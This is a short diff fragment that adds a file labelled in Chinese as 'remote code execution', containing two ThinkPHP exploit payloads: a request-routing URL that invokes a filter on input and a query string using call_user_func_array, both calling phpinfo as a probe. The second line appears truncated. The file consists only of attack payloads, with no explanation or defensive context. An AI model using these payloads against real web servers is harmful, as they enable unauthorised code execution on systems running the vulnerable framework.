@@ -1,0 +1,4 @@
+'远程代码执行'
+http://www.t.ghj/?s=index/\think\Request/input&filter=phpinfo&data=1
+=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
+
